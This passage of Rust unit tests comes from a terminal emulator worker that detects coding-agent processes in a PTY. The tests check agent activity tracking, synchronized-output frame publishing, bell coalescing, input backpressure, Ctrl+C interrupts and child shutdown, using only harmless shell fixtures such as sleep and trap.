                    "PI_CODING_AGENT_DIR".into(),
                    directory.path().to_str().unwrap().into(),
                ),
            ]),
        });
        let deadline = Instant::now() + Duration::from_secs(3);
        let process = loop {
            if let Some(process) = worker.observe_agent_process().cloned() {
                break process;
            }
            assert!(Instant::now() < deadline, "PTY foreground never became OMP");
            std::thread::sleep(Duration::from_millis(1));
        };
        let tty = std::fs::read_link(format!("/proc/{}/fd/0", process.pid)).unwrap();
        let markers = directory.path().join("terminal-sessions");
        std::fs::create_dir(&markers).unwrap();
        std::fs::write(
            markers.join(format!(
                "pts-{}",
                tty.file_name().unwrap().to_str().unwrap()
            )),
            format!(
                "{}\n{}\n",
                directory.path().display(),
                directory
                    .path()
                    .join("sessions/fresh_12345678-1234-1234-1234-123456789abc.jsonl")
                    .display()
            ),
        )
        .unwrap();
        worker.handle_command(Command::Hide);
        let generation = worker.generation;
        for title in ["π ⠋ fresh", "π ⠙ fresh", "π ! fresh", "π > fresh"] {
            worker.process_output(format!("\x1b]2;{title}\x07").into_bytes());
            assert!(
                worker
                    .resume_hint
                    .as_deref()
                    .and_then(crate::model::agent_recovery::recipe_from_hint)
                    .is_none(),
                "recognizing a fresh agent must not grant resume authority"
            );
        }
        let activity = events
            .try_iter()
            .filter_map(|event| match event {
                TerminalEvent::AgentActivityChanged(activity) => Some(activity),
                _ => None,
            })
            .collect::<Vec<_>>();
        assert_eq!(
            activity,
            [
                ActivityState::Unknown,
                ActivityState::Working,
                ActivityState::Waiting,
                ActivityState::Idle
            ]
            .map(|state| Some(Activity {
                provider: Provider::Omp,
                state
            }))
        );
        assert_eq!(
            worker.generation, generation,
            "hidden activity must not render"
        );
        worker.run();
    }

    #[test]
    fn activity_application_rejects_replaced_processes_and_expired_results() {
        use crate::agent::{Activity, ActivityState, Provider};
        use std::time::Instant;
        let directory = tempdir().unwrap();
        let executable = directory.path().join("claude");
        // A harmless native executable with recognizable argv; no provider I/O.
        symlink("/bin/sleep", &executable).unwrap();
        let (mut worker, _) = capture_worker_for(LaunchRecipe {
            unset_environment: Default::default(),
            program: executable.to_str().unwrap().into(),
            arguments: vec!["10".into()],
            working_directory: directory.path().into(),
            environment: BTreeMap::new(),
        });
        let startup_deadline = Instant::now() + Duration::from_secs(3);
        let process = loop {
            if let Some(process) = worker.observe_agent_process().cloned() {
                break process;
            }
            assert!(
                Instant::now() < startup_deadline,
                "PTY foreground never became Claude"
            );
            std::thread::sleep(Duration::from_millis(1));
        };
        let unknown = Some(Activity {
            provider: Provider::Claude,
            state: ActivityState::Unknown,
        });
        assert_eq!(
            *worker.published.agent_activity.lock().unwrap(),
            unknown,
            "a fresh foreground agent has identity before it reports activity"
        );
        let (reply, result) = crossbeam_channel::bounded(1);
        worker.handle_command(Command::ApplyAgentActivity {
            process: process.clone(),
            activity: None,
            title: None,
            reply,
            deadline: Instant::now() + Duration::from_secs(3),
        });
        assert_eq!(
            result.recv().unwrap(),
            unknown,
            "unavailable provider state must not erase a confirmed live identity"
        );
        let working = Some(Activity {
            provider: Provider::Claude,
            state: ActivityState::Working,
        });
        let apply = |worker: &mut Worker, process: AgentProcess, deadline| {
            let (reply, result) = crossbeam_channel::bounded(1);
            worker.handle_command(Command::ApplyAgentActivity {
                process,
                activity: working,
                title: None,
                reply,
                deadline,
            });
            result.recv().unwrap()
        };
        let deadline = || std::time::Instant::now() + Duration::from_secs(3);
        assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
        let discovery_count = || {
            crate::model::agent_recovery::FOREGROUND_AGENT_OBSERVATIONS.with(std::cell::Cell::get)
        };
        let before = discovery_count();
        for _ in 0..100 {
            assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
        }
        assert_eq!(
            discovery_count(),
            before,
            "unchanged samples must not descend /proc again"
        );
        let mut replaced = process.clone();
        replaced.start = replaced.start.wrapping_add(1);
        assert_eq!(apply(&mut worker, replaced, deadline()), None);
        assert_eq!(
            *worker
                .published
                .agent_activity
                .lock()
                .unwrap_or_else(|error| error.into_inner()),
            None
        );
        assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
        let mut other_process = process.clone();
        other_process.pid += 1;
        assert_eq!(apply(&mut worker, other_process, deadline()), None);
        assert_eq!(apply(&mut worker, process.clone(), deadline()), working);
        assert_eq!(
            apply(&mut worker, process.clone(), std::time::Instant::now()),
            None
        );
        worker.adopt_agent_process(Some(process));
        worker.set_agent_activity(working);
        worker.adopt_agent_process(None);
        assert_eq!(
            *worker.published.agent_activity.lock().unwrap(),
            None,
            "a shell cannot retain the previous agent identity"
        );
        // The disconnected command channel drives normal kill/reap teardown.
        worker.run();
    }

    #[test]
    fn parser_metadata_storm_is_collapsed_before_semantic_delivery() {
        let (mut worker, events) = capture_worker();
        let mut output = vec![b'\x07'; 1024 * 1024];
        for index in 0..10_000 {
            output.extend_from_slice(format!("\x1b]2;title-{index}\x07").as_bytes());
        }
        worker.process_output(output);
        assert_eq!(
            events.try_iter().collect::<Vec<_>>(),
            vec![
                TerminalEvent::Bell,
                TerminalEvent::TitleChanged("title-9999".into()),
            ]
        );
        worker.run();
    }

    #[test]
    fn bells_publish_promptly_then_keep_one_pending_reminder() {
        let now = std::time::Instant::now();
        let mut bell = Bell::default();
        bell.pending = true;
        assert!(bell.take_ready(now));
        for _ in 0..10_000 {
            bell.pending = true;
            assert!(!bell.take_ready(now + BELL_INTERVAL / 2));
        }
        assert!(bell.take_ready(now + BELL_INTERVAL));
        assert!(!bell.pending);
        assert!(!bell.take_ready(now + 2 * BELL_INTERVAL));
    }

    #[test]
    fn capture_credit_coalesces_batches_and_preserves_semantic_events() {
        let (mut worker, events) = capture_worker();
        worker.publish_snapshot(true);
        let first = worker.generation;
        worker.process_output(b"old".to_vec());
        worker.process_output(b"\r\x1b[2Klatest\x07\x1b]2;title\x07".to_vec());
        assert_eq!(worker.generation, first);
        assert_eq!(
            worker
                .published
                .activity
                .lock()
                .unwrap_or_else(|error| error.into_inner())
                .unwrap()
                .sequence,
            2
        );
        assert_eq!(
            events.try_iter().collect::<Vec<_>>(),
            vec![
                TerminalEvent::Bell,
                TerminalEvent::TitleChanged("title".into())
            ]
        );
        worker.published.acknowledge(first);
        worker.capture_if_ready();
        let snapshot = worker.published.snapshot.load_full();
        assert_eq!(
            snapshot.lines[0]
                .cells
                .iter()
                .take(6)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "latest"
        );
        assert_eq!(snapshot.activity.unwrap().sequence, 2);
        // Returning old credit cannot buy an extra snapshot.
        worker.process_output(b"!".to_vec());
        worker.published.acknowledge(first);
        worker.capture_if_ready();
        assert_eq!(worker.generation, first + 1);
        worker.published.acknowledge(first + 1);
        worker.capture_if_ready();
        assert_eq!(worker.published.snapshot.load().lines[0].cells[6].text, "!");
        // An ACK arriving before the next output also cannot strand that output.
        worker.published.acknowledge(worker.generation);
        worker.process_output(b"?".to_vec());
        assert_eq!(worker.published.snapshot.load().lines[0].cells[7].text, "?");
        worker.published.acknowledge(worker.generation);
        let previous = worker.published.snapshot.load_full();
        worker.process_output(b"\x1b[31m".to_vec());
        let activity_only = worker.published.snapshot.load_full();
        assert_eq!(activity_only.lines, previous.lines);
        assert!(activity_only.activity.unwrap().sequence > previous.activity.unwrap().sequence);
        worker.run();
    }

    fn published_row(worker: &Worker, row: usize) -> String {
        worker.published.snapshot.load().lines[row]
            .cells
            .iter()
            .map(|cell| cell.text.as_str())
            .collect::<String>()
            .trim_end()
            .to_owned()
    }

    /// Returns the consumer's credit for whatever is published, as a presented
    /// frame would.
    fn present(worker: &Worker) {
        worker.published.acknowledge(worker.generation);
    }

    #[test]
    fn synchronized_update_publishes_only_its_finished_frame() {
        let (mut worker, _) = capture_worker();
        worker.process_output(b"old frame".to_vec());
        worker.publish_snapshot(true);
        present(&worker);
        let before = worker.generation;

        // A TUI repainting after SIGWINCH clears the screen inside the update.
        // Reads split the repaint anywhere, so the clear can arrive alone.
        worker.process_output(b"\x1b[?2026h\x1b[H\x1b[2J".to_vec());
        assert_eq!(
            worker.generation, before,
            "the cleared screen was published"
        );
        assert_eq!(published_row(&worker, 0), "old frame");
        assert!(worker.synchronized_release_after().is_some());
        worker.process_output(b"new ".to_vec());
        // Credit returning mid-update cannot publish the half-drawn frame either.
        worker.capture_if_ready();
        assert_eq!(worker.generation, before);

        worker.process_output(b"frame\x1b[?2026l".to_vec());
        assert_eq!(worker.generation, before + 1);
        assert_eq!(published_row(&worker, 0), "new frame");
        assert_eq!(worker.synchronized_release_after(), None);
        worker.run();
    }

    #[test]
    fn independent_viewport_can_read_a_dirty_parser_without_ack_deadlock() {
        let (mut worker, _) = capture_worker();
        worker.process_output(b"first frame".to_vec());
        worker.publish_snapshot(true);
        worker.process_output(b"\rnew frame".to_vec());
        assert!(worker.capture_dirty);
        let (reply, receive) = crossbeam_channel::bounded(1);
        worker.handle_command(Command::ReadViewport {
            offset: Some(0),
            rows: 10,
            reply,
        });
        let capture = receive
            .recv_timeout(Duration::from_secs(1))
            .unwrap()
            .unwrap();
        assert_eq!(capture.generation, worker.generation);
        let text = capture.lines[0]
            .cells
            .iter()
            .map(|cell| cell.text.as_str())
            .collect::<String>();
        assert!(text.starts_with("new frame"));
        worker.run();
    }

    #[test]
    fn independent_viewport_waits_for_the_complete_synchronized_frame() {
        let (mut worker, _) = capture_worker();
        worker.process_output(b"old frame".to_vec());
        worker.publish_snapshot(true);
        present(&worker);
        worker.process_output(b"\x1b[?2026h\x1b[H\x1b[2Jpartial".to_vec());
        let (reply, receive) = crossbeam_channel::bounded(1);
        worker.handle_command(Command::ReadViewport {
            offset: Some(0),
            rows: 10,
            reply,
        });
        assert!(receive.try_recv().is_err());
        worker.process_output(b" frame\x1b[?2026l".to_vec());
        let capture = receive
            .recv_timeout(Duration::from_secs(1))
            .unwrap()
            .unwrap();
        assert_eq!(capture.generation, worker.generation);
        let text = capture.lines[0]
            .cells
            .iter()
            .map(|cell| cell.text.as_str())
            .collect::<String>();
        assert!(text.starts_with("partial frame"));
        worker.run();
    }

    #[test]
    fn synchronized_update_left_open_is_released_after_its_timeout() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        present(&worker);
        let before = worker.generation;

        worker.process_output(b"\x1b[?2026hstuck".to_vec());
        assert_eq!(worker.generation, before);
        let release = worker.synchronized_release_after().unwrap();
        assert!(release <= SYNCHRONIZED_OUTPUT_TIMEOUT);

        worker.synchronized_since = Some(std::time::Instant::now() - SYNCHRONIZED_OUTPUT_TIMEOUT);
        // A lapsed hold needs no timer, even while the grid is still dirty.
        assert_eq!(worker.synchronized_release_after(), None);
        worker.capture_if_ready();
        assert_eq!(worker.generation, before + 1);
        assert_eq!(published_row(&worker, 0), "stuck");
        assert_eq!(worker.synchronized_release_after(), None);
        worker.run();
    }

    #[test]
    fn an_update_restarted_while_credit_is_owed_gets_its_own_hold() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        present(&worker);
        worker.process_output(b"old".to_vec());
        let published = worker.generation;
        assert_eq!(published_row(&worker, 0), "old");

        // The consumer still owes credit for that frame while an update runs
        // long enough that its own hold would have lapsed.
        worker.process_output(b"\x1b[?2026hhalf".to_vec());
        worker.synchronized_since = Some(std::time::Instant::now() - SYNCHRONIZED_OUTPUT_TIMEOUT);
        // One read ends it and begins the next; no capture sees the gap.
        worker.process_output(b" done\x1b[?2026l\x1b[?2026hnext".to_vec());
        present(&worker);
        worker.capture_if_ready();
        assert_eq!(
            worker.generation, published,
            "the next update's half-drawn frame was published"
        );
        assert_eq!(published_row(&worker, 0), "old");

        worker.process_output(b" frame\x1b[?2026l".to_vec());
        assert_eq!(worker.generation, published + 1);
        assert_eq!(published_row(&worker, 0), "oldhalf donenext frame");
        worker.run();
    }

    #[test]
    fn a_revealed_card_gives_the_update_in_progress_a_full_hold() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        present(&worker);
        worker.process_output(b"\x1b[?2026hhalf".to_vec());
        // An update seen long ago, before the card went away.
        worker.synchronized_since = Some(std::time::Instant::now() - SYNCHRONIZED_OUTPUT_TIMEOUT);
        worker.handle_command(Command::Hide);
        let before = worker.generation;

        worker.handle_command(Command::Reveal);
        assert_eq!(worker.generation, before, "a half-drawn frame was revealed");
        worker.process_output(b" done\x1b[?2026l".to_vec());
        assert_eq!(published_row(&worker, 0), "half done");
        worker.run();
    }

    #[test]
    fn a_resize_shows_its_reflow_at_once_and_holds_the_repaint_it_prompts() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        present(&worker);
        let before = worker.generation;
        worker.process_output(b"\x1b[?2026hpending".to_vec());
        assert_eq!(worker.generation, before);

        // The parser ends an update on resize, as Ghostty does, so the new
        // size is never held back behind the old one's frame.
        worker.resize(TerminalSize {
            columns: 40,
            rows: 10,
            cell_width_px: 8,
            cell_height_px: 16,
        });
        assert_eq!(worker.generation, before + 1);
        assert_eq!(worker.published.snapshot.load().columns, 40);
        present(&worker);

        // The child answers SIGWINCH by clearing and repainting inside a new
        // update; only the repainted frame is published.
        worker.process_output(b"\x1b[?2026h\x1b[H\x1b[2J".to_vec());
        assert_eq!(worker.generation, before + 1);
        worker.process_output(b"repainted\x1b[?2026l".to_vec());
        assert_eq!(worker.generation, before + 2);
        assert_eq!(published_row(&worker, 0), "repainted");
        worker.run();
    }

    #[test]
    fn exit_publishes_a_final_grid_left_inside_an_update() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        present(&worker);
        worker.process_output(b"\x1b[?2026hlast words".to_vec());
        let published = Arc::clone(&worker.published);
        // Keep the command channel connected so child EOF, not client
        // teardown, ends the worker loop.
        let (_commands, receiver) = command_channel(1);
        worker.commands = receiver;
        worker.run();
        assert_eq!(
            published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(10)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "last words"
        );
    }

    #[test]
    fn a_withheld_update_wakes_the_worker_after_the_child_exits() {
        let (_command_tx, command_rx) = command_channel(1);
        let (_pty_tx, pty_rx) = crossbeam_channel::bounded::<PtyMessage>(1);
        let (_child_exit_tx, child_exit_rx) = crossbeam_channel::bounded(1);
        assert!(matches!(
            wait_for_worker_event(
                &command_rx,
                &pty_rx,
                &child_exit_rx,
                &crossbeam_channel::never(),
                true,
                false,
                FOREGROUND_POLL_MAX,
                Some(Duration::from_millis(1)),
            ),
            WorkerEvent::Timer
        ));
    }

    #[test]
    fn eof_preserves_final_grid_without_outstanding_consumer_credit() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        worker.process_output(b"final".to_vec());
        let published = Arc::clone(&worker.published);
        // Keep the command channel connected so child EOF, not client teardown,
        // ends the worker loop.
        let (_commands, receiver) = command_channel(1);
        worker.commands = receiver;
        worker.run();
        assert_eq!(
            published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(5)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "final"
        );
    }

    #[test]
    fn hidden_eof_preserves_final_contents_without_visual_wakes() {
        let (mut worker, _) = capture_worker();
        worker.set_hidden();
        worker.process_output(b"hidden".to_vec());
        assert_eq!(worker.generation, 0);
        let published = Arc::clone(&worker.published);
        let (_commands, receiver) = command_channel(1);
        worker.commands = receiver;
        worker.run();
        assert_eq!(published.announced_generation.load(Ordering::Acquire), 0);
        assert_eq!(
            published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(6)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "hidden"
        );
    }

    #[test]
    fn agent_process_edges_wake_even_when_the_activity_scalar_is_unchanged() {
        let (mut worker, events) = capture_worker();
        let wakes = Arc::new(AtomicUsize::new(0));
        let observed = Arc::clone(&wakes);
        assert!(
            worker
                .published
                .agent_observer
                .set(Arc::new(move || {
                    observed.fetch_add(1, Ordering::AcqRel);
                }))
                .is_ok()
        );
        let mut process = AgentProcess {
            pid: 1,
            start: 2,
            provider: crate::agent::Provider::Claude,
            launch: worker.launch.clone(),
            recovery: worker.launch.clone(),
        };
        worker.adopt_agent_process(Some(process.clone()));
        worker.adopt_agent_process(Some(process.clone()));
        assert_eq!(wakes.load(Ordering::Acquire), 1);
        process.start += 1;
        worker.adopt_agent_process(Some(process.clone()));
        assert_eq!(wakes.load(Ordering::Acquire), 2);
        assert_eq!(
            *worker.published.agent_process.lock().unwrap(),
            Some(process)
        );
        assert_eq!(
            events
                .try_iter()
                .filter(|event| matches!(event, TerminalEvent::AgentActivityChanged(_)))
                .count(),
            1,
            "replacing Unknown with Unknown wakes discovery, not subscribers"
        );
        worker.published.set_agent_activity(None);
        worker.published.set_agent_activity(None);
        assert_eq!(
            events
                .try_iter()
                .filter(|event| matches!(event, TerminalEvent::AgentActivityChanged(None)))
                .count(),
            1,
            "owner timeout clears are pushed exactly once"
        );
        worker.set_conversation_title("Same conversation".into());
        worker.set_conversation_title("Same conversation".into());
        assert_eq!(
            events
                .try_iter()
                .filter(|event| matches!(event, TerminalEvent::ConversationTitleChanged(_)))
                .count(),
            1
        );
        worker.adopt_agent_process(None);
        assert_eq!(wakes.load(Ordering::Acquire), 3);
        assert!(worker.published.agent_process.lock().unwrap().is_none());
        worker.run();
    }

    #[test]
    fn foreground_sampling_discovers_shell_exec_without_a_process_group_change() {
        let directory = tempdir().unwrap();
        let executable = directory.path().join("claude");
        symlink("/bin/sleep", &executable).unwrap();
        let (mut worker, _) = capture_worker_for(LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sh".into(),
            arguments: vec!["-c".into(), "read line; exec \"$AGENT\" 10".into()],
            working_directory: directory.path().into(),
            environment: BTreeMap::from([("AGENT".into(), executable.to_str().unwrap().into())]),
        });
        worker.observe_foreground();
        let original_group = worker.foreground_group();
        assert!(original_group.is_some());
        assert!(worker.agent_process.is_none());
        worker.write_pty(b"start\n", "fixture input");
        let deadline = std::time::Instant::now() + Duration::from_secs(3);
        while worker.agent_process.is_none() {
            worker.observe_foreground();
            assert!(
                std::time::Instant::now() < deadline,
                "unchanged foreground group hid shell exec"
            );
            std::thread::sleep(Duration::from_millis(5));
        }
        assert_eq!(worker.foreground_group(), original_group);
        assert_eq!(
            worker.agent_process.as_ref().unwrap().provider,
            crate::agent::Provider::Claude
        );
        assert!(worker.published.agent_process.lock().unwrap().is_some());
        worker.run();
    }

    #[test]
    fn foreground_observation_backs_off_and_slows_for_unwatched_terminals() {
        // A long-lived child keeps the foreground group stable for the whole
        // test, so every tick below takes its "nothing changed" path.
        let (mut worker, _) = capture_worker_for(LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sleep".into(),
            arguments: vec!["10".into()],
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        });
        worker.resume_foreground = worker.foreground_group();
        assert!(worker.agent_process.is_none());

        // With the same group and no agent to track, the interval stretches instead of descending /proc every 2s forever.
        worker.observe_foreground();
        assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN * 2);
        worker.observe_foreground();
        assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN * 4);
        assert_eq!(worker.resume_foreground, worker.foreground_group());

        // A terminal nobody is watching still re-walks a tracked agent, at the
        // slowest interval, so its saved identity stays current for recovery
        // even though the agent never leaves the foreground.
        worker.set_hidden();
        let launch = worker.launch.clone();
        worker.agent_process = Some(crate::model::agent_recovery::AgentProcess {
            pid: 1,
            start: 0,
            provider: crate::agent::Provider::Claude,
            launch: launch.clone(),
            recovery: launch,
        });
        worker.observe_foreground();
        assert!(
            worker.agent_process.is_none(),
            "the tracked agent was re-observed"
        );
        assert_eq!(worker.resume_foreground, worker.foreground_group());
        assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MAX);

        // Revealing it makes the next observation prompt again.
        worker.reveal();
        assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN);
    }

    #[test]
    fn shutdown_bounds_a_root_that_ignores_hangup_and_preserves_graceful_exit() {
        use std::io::Read as _;
        struct Cleanup<'a>(&'a holder::HeldChild);
        impl Drop for Cleanup<'_> {
            fn drop(&mut self) {
                let _ = self.0.force_kill();
            }
        }
        for (script, expected_code) in [
            ("trap '' HUP; printf ready; while :; do sleep 1; done", None),
            (
                "trap 'exit 3' HUP; printf ready; while :; do sleep 0.05; done",
                Some(3),
            ),
        ] {
            let mut command = portable_pty::CommandBuilder::new("/bin/sh");
            command.args(["-c", script]);
            let (sender, exits) = crossbeam_channel::bounded(1);
            let held = holder::spawn(
                command,
                portable_pty::PtySize {
                    rows: 24,
                    cols: 80,
                    pixel_width: 0,
                    pixel_height: 0,
                },
                sender,
            )
            .unwrap();
            let cleanup = Cleanup(&held.child);
            let mut reader = std::fs::File::from(held.master.duplicate().unwrap());
            let flags = unsafe { libc::fcntl(reader.as_raw_fd(), libc::F_GETFL) };
            assert!(flags >= 0);
            // This test owns the master and uses it only for readiness input.
            assert_eq!(
                unsafe { libc::fcntl(reader.as_raw_fd(), libc::F_SETFL, flags | libc::O_NONBLOCK) },
                0
            );
            let deadline = std::time::Instant::now() + Duration::from_secs(5);
            let mut ready = [0; 5];
            let mut received = 0;
            while received < ready.len() {
                let remaining = deadline.saturating_duration_since(std::time::Instant::now());
                assert!(
                    !remaining.is_zero(),
                    "held fixture did not print readiness before its deadline"
                );
                let mut target = libc::pollfd {
                    fd: reader.as_raw_fd(),
                    events: libc::POLLIN,
                    revents: 0,
                };
                // One owned descriptor; retry an interrupted wait against the
                // same deadline rather than extending the readiness budget.
                let polled = unsafe {
                    libc::poll(
                        &mut target,
                        1,
                        remaining.as_millis().min(i32::MAX as u128) as i32,
                    )
                };
                if polled < 0
                    && std::io::Error::last_os_error().kind() == std::io::ErrorKind::Interrupted
                {
                    continue;
                }
                assert!(polled > 0, "held fixture readiness wait failed or expired");
                match reader.read(&mut ready[received..]) {
                    Ok(0) => panic!("held fixture closed before readiness"),
                    Ok(count) => received += count,
                    Err(error)
                        if matches!(
                            error.kind(),
                            std::io::ErrorKind::WouldBlock | std::io::ErrorKind::Interrupted
                        ) => {}
                    Err(error) => panic!("read held fixture readiness: {error}"),
                }
            }
            assert_eq!(&ready, b"ready");
            let root = RootIdentity::capture(held.child.pid(), None).unwrap();
            let started = std::time::Instant::now();
            let status = shutdown_child_exit(&held.child, Some(&root), &exits, false).unwrap();
            assert!(started.elapsed() < CHILD_SHUTDOWN_DEADLINE);
            match expected_code {
                Some(code) => assert_eq!(status.exit_code(), code),
                None => assert!(status.signal().is_some()),
            }
            assert!(!held.child.unreaped());
            drop(cleanup);
            drop(held);
        }
    }

    #[test]
    fn shutdown_does_not_fabricate_completion_when_holder_reporting_fails() {
        let mut command = portable_pty::CommandBuilder::new("/bin/sh");
        command.args(["-c", "exit 0"]);
        let (sender, exits) = crossbeam_channel::bounded(1);
        let held = holder::spawn(
            command,
            portable_pty::PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            },
            sender,
        )
        .unwrap();
        let (sender, disconnected) = crossbeam_channel::bounded(1);
        drop(sender);
        assert!(
            matches!(shutdown_child_exit(&held.child, None, &disconnected, true), Err(message) if message == "child reaper closed")
        );
        assert!(matches!(
            child_exit_event(&mut false, Err("child reaper closed".into()), false),
            Some(TerminalEvent::Error { .. })
        ));
        let _ = exits.recv_timeout(CHILD_SHUTDOWN_DEADLINE);
    }

    #[test]
    fn nonreading_child_keeps_publishing_and_interrupt_bypasses_backpressure() {
        let handle = TerminalHandle::spawn(
            shell_session("stty -echo -icanon; trap 'echo interrupted; exit 0' INT; echo ready; while :; do echo tick; sleep 0.05; done"),
            TerminalConfig::default(), |_| {},
        ).unwrap();
        wait_for_text(&handle, "ready");
        let before = handle.snapshot().generation;
        for _ in 0..3 {
            handle
                .paste("x".repeat(1024 * 1024), PasteOrigin::Clipboard)
                .unwrap();
        }
        let deadline = std::time::Instant::now() + Duration::from_secs(3);
        let mut backpressure = false;
        while std::time::Instant::now() < deadline {
            let snapshot = handle.snapshot();
            handle.acknowledge_redraw(snapshot.generation);
            backpressure |= handle.events().try_iter().any(|event| {
                matches!(event,
                TerminalEvent::Error { message, .. } if message.contains("isn't reading input"))
            });
            if backpressure && snapshot.generation > before {
                break;
            }
            thread::sleep(Duration::from_millis(10));
        }
        assert!(
            backpressure,
            "pending byte bound must report backpressure to client"
        );
        assert!(
            handle.snapshot().generation > before,
            "output stalled behind PTY write"
        );
        handle.input(vec![3]).unwrap();
        wait_for_text(&handle, "interrupted");
        let started = std::time::Instant::now();
        handle.shutdown().unwrap();
        assert!(started.elapsed() < WORKER_JOIN_TIMEOUT + Duration::from_millis(100));
    }

    #[test]
    fn nonreading_child_shutdown_is_bounded_with_a_full_pending_paste() {
        let handle = TerminalHandle::spawn(
            shell_session("stty -echo -icanon; echo ready; exec sleep 600"),
            TerminalConfig::default(),
            |_| {},
        )
        .unwrap();
        wait_for_text(&handle, "ready");
        handle
            .paste("x".repeat(1024 * 1024), PasteOrigin::Clipboard)
            .unwrap();
        thread::sleep(Duration::from_millis(50));
        let started = std::time::Instant::now();
        handle.shutdown().unwrap();
        assert!(started.elapsed() < WORKER_JOIN_TIMEOUT + Duration::from_millis(100));
    }

    #[test]
    fn interrupt_bypasses_kernel_only_input_backpressure() {
        for requested in [4096, 1024 * 1024] {
            let (mut worker, _) = capture_worker_for(shell_session(
                "stty -echo -icanon; trap 'exit 0' INT; echo ready; while :; do echo tick; sleep 0.05; done"
            ).launch);
            let deadline = std::time::Instant::now() + Duration::from_secs(3);
            loop {
                let message = worker
                    .pty_rx
                    .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
                    .unwrap();
                if let PtyMessage::Bytes(bytes) = &message
                    && bytes.windows(5).any(|word| word == b"ready")
                {
                    worker.handle_pty_message(Some(message));
                    break;
                }
                worker.handle_pty_message(Some(message));
            }
            let mut accepted = 0;
            while accepted < requested {
                match worker.writer.write(&[b'x'; 1024]) {
                    Ok(0) => break,
                    Ok(count) => accepted += count,
                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => break,
                    Err(error) if error.kind() == std::io::ErrorKind::Interrupted => {}
                    Err(error) => panic!("fill PTY: {error}"),
                }
            }
            assert!(accepted > 0);
            assert!(
                worker.pending_input.is_empty(),
                "all accepted bytes are already inside the kernel"
            );
            if requested == 4096 {
                assert_eq!(accepted, requested);
            } else {
                assert!(accepted < requested);
            }
            worker.interrupt_input();
            assert!(
                worker.child.exited_within(Duration::from_secs(3)).unwrap(),
                "Ctrl+C was trapped behind {accepted} kernel bytes"
            );
            worker.run();
        }
    }

    #[test]
    fn raw_interrupt_flushes_canceled_paste_and_preserves_its_control_byte() {
        for extended in [false, true] {
            let mut key = key_input(
                KeyAction::Press,
                TerminalKey::Character('c'),
                Some("c"),
                Some('c'),
            );
            key.modifiers.control = true;
            let mut release = key.clone();
            release.action = KeyAction::Release;
            let mut terminal = Terminal::new(TerminalOptions {
                cols: 80,
                rows: 24,
                max_scrollback: 0,
            })
            .unwrap();
            if extended {
                terminal.vt_write(b"\x1b[>3u");
            }
            let mut encoder = KeyEncoder::new().unwrap();
            let mut expected = encode_key_input(&terminal, &mut encoder, key.clone()).unwrap();
            expected.extend(encode_key_input(&terminal, &mut encoder, release.clone()).unwrap());
            let announce = if extended { "\\033[>3u" } else { "" };
            let script = format!(
                "stty raw -echo; printf '{announce}ready\\r\\n'; kill -STOP $$; od -An -tu1 -N{}",
                expected.len()
            );
            let (mut worker, _) = capture_worker_for(shell_session(&script).launch);
            let deadline = std::time::Instant::now() + Duration::from_secs(3);
            loop {
                let message = worker
                    .pty_rx
                    .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
                    .unwrap();
                let ready = matches!(&message, PtyMessage::Bytes(bytes) if bytes.windows(5).any(|word| word == b"ready"));
                worker.handle_pty_message(Some(message));
                if ready {
                    break;
                }
            }
            worker.writer.write_all(&[b'x'; 4096]).unwrap();
            let (commands, receiver) = command_channel(4);
            worker.commands = receiver;
            commands.send(Command::Key(release)).unwrap();
            commands
                .send(Command::Mouse(MouseInput {
                    action: MouseAction::Release,
                    button: Some(MouseButton::Left),
                    modifiers: KeyModifiers::default(),
                    x: 0.0,
                    y: 0.0,
                    screen_width: 80,
                    screen_height: 24,
                    cell_width: 1,
                    cell_height: 1,
                    any_button_pressed: false,
                }))
                .unwrap();
            commands
                .send(Command::Paste("canceled".into(), PasteOrigin::Clipboard))
                .unwrap();
            worker.published.request_interrupt(Some(key));
            worker.interrupt_input();
            assert_eq!(
                worker.retained_commands.len(),
                2,
                "key/button releases survive canceled paste"
            );
            assert!(worker.retained_commands.iter().any(|command| matches!(command, Command::Mouse(mouse) if mouse.action == MouseAction::Release)));
            while let Some(command) = worker.retained_commands.pop_front() {
                worker.handle_command(command);
            }
            close_processes::signal(&worker.child.shutdown_pidfd().unwrap(), libc::SIGCONT)
                .unwrap();
            let mut output = String::new();
            let deadline = std::time::Instant::now() + Duration::from_secs(3);
            while std::time::Instant::now() < deadline {
                worker.flush_pty_input();
                let message = match worker.pty_rx.recv_timeout(Duration::from_millis(10)) {
                    Ok(message) => message,
                    Err(crossbeam_channel::RecvTimeoutError::Timeout) => continue,
                    Err(_) => break,
                };
                if let PtyMessage::Bytes(bytes) = message {
                    output.push_str(&String::from_utf8_lossy(&bytes));
                } else {
                    break;
                }
                let observed: Vec<u8> = output
                    .split_whitespace()
                    .filter_map(|word| word.parse().ok())
                    .collect();
                if observed.len() >= expected.len() {
                    assert_eq!(observed, expected, "extended={extended}: {output}");
                    break;
                }
            }
            let observed: Vec<u8> = output
                .split_whitespace()
                .filter_map(|word| word.parse().ok())
                .collect();
            assert_eq!(observed, expected, "extended={extended}: {output}");
            drop(commands);
            worker.run();
        }
    }

    #[test]
    fn repeated_interrupt_retains_selected_and_coalesced_control_commands() {
